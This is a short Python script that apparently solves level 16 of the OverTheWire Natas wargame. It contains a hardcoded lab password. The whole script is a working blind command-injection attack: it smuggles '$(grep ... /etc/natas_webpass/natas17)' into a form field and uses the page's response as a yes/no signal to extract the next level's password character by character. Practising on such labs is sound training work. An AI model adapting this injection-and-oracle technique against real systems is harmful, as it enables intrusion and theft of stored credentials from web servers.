import requests

url = "http://natas16.natas.labs.overthewire.org/index.php"
username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

charset = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"

contain_text = "Asians"


def post_payload(payload):
    response = requests.post(url, payload, auth=requests.auth.HTTPBasicAuth(username, password))
    if (contain_text in response.text):
        return False
    return True

def used_set():
    print("Determining used char set")
    used_set = set()
    for c in charset:
        payload = {"needle": "$(grep -e ^.*" + c + ".* /etc/natas_webpass/natas17)asians"}
        if post_payload(payload):
            print("Detected char: " + c)
            used_set.add(c)
    return used_set
    
def get_pass():
    print("Trying to get password")
    stage_password = ""
    char_set = used_set()
    while(1):
        found = False
        for c in char_set:
            payload = {"needle": "$(grep -e ^" + stage_password + c + ".* /etc/natas_webpass/natas17)asians"}
            if post_payload(payload):
                stage_password = stage_password + c
                print("Current password: " + stage_password)
                found = True
        if (found == False):
            break
    return stage_password

if __name__ == "__main__":
    print("Working :D")
    print("Password is: " + get_pass())
    
        